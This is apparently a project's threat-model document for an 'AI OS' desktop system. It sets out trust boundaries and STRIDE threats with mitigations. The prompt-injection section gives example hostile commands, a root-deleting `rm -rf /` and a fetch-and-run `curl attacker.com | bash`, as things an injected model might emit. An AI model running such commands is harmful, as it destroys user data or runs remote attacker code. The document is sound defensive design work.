# SRITEC AI OS — System Threat Model & Risk Analysis

> **Document:** `docs/THREAT_MODEL.md`  
> **Methodology:** STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)  

---

## 1. Trust Boundaries

```
[ UNTRUSTED EXTERNAL WORLD / INTERNET ]
                 │
                 ▼  (TLS 1.2/1.3 + Strict CA Verification)
[ CLOUD AI ENDPOINTS (Google, OpenAI, Anthropic) ]
                 ▲
                 │  (Outbound HTTPS Only; No Inbound Ports)
┌────────────────┴───────────────────────────────────────────────────────┐
│ TRUST BOUNDARY A: Network Transport Subsystem                          │
│ • QtNetworkTransport                                                  │
└────────────────┬───────────────────────────────────────────────────────┘
                 │
┌────────────────┴───────────────────────────────────────────────────────┐
│ TRUST BOUNDARY B: Core Backend Process (C++20 unprivileged user space) │
│ • ProviderManager, KeyStore, Memory Cleansing                          │
└────────────────┬───────────────────────────────────────────────────────┘
                 │  (QObject Properties: bools, strings; NO RAW SECRETS)
┌────────────────┴───────────────────────────────────────────────────────┐
│ TRUST BOUNDARY C: QML Presentation Layer                               │
│ • AIAssistantView, StatusPanel, Desktop Canvas                         │
└────────────────┬───────────────────────────────────────────────────────┘
                 │  (Whitelist Guardrail; Interactive Human Confirmation)
┌────────────────┴───────────────────────────────────────────────────────┐
│ TRUST BOUNDARY D: OS Process Execution & Local Filesystem              │
│ • Target binaries executed via argument vectors (NO /bin/sh -c)        │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Attack Vectors & Mitigations

### 2.1 Threat: Prompt Injection / Indirect Prompt Hijacking
- **Vector:** An AI model generates a malicious terminal command (e.g. `rm -rf /` or `curl attacker.com | bash`) within a streamed response.
- **Mitigation:** The AI output is treated as untrusted text. Commands cannot auto-execute. Commands passed to the terminal guardrail (`AIBridge::evaluateCommand`) are analyzed against a strict whitelist. Shell chaining, pipes, redirection, and dangerous utilities are immediately rejected.

### 2.2 Threat: Credential Theft / Memory Scraping
- **Vector:** Malware or memory dumps extract cloud API keys.
- **Mitigation:** Keys are never stored on disk in plaintext. Frontend QML components only receive boolean availability flags. When keys are replaced or cleared, memory buffers are explicitly cleansed using volatile memory zeroing.

### 2.3 Threat: Man-in-the-Middle (MITM) / Rogue Certificate
- **Vector:** Intercepting outbound requests to cloud AI endpoints using fake certificates.
- **Mitigation:** `QtNetworkTransport` configures `QSsl::SecureProtocols`. `QNetworkReply::sslErrors` triggers immediate request termination with error code 495; `ignoreSslErrors` is never called.

### 2.4 Threat: Physical Hardware & Robotics Accidents
- **Vector:** Autonomous robotics agents dispatch unverified physical actuator commands causing equipment damage or human injury.
- **Mitigation:** Mandatory hardware safety limits, emergency stop protocol, simulation verification before real hardware dispatch, and human-in-the-loop overrides.
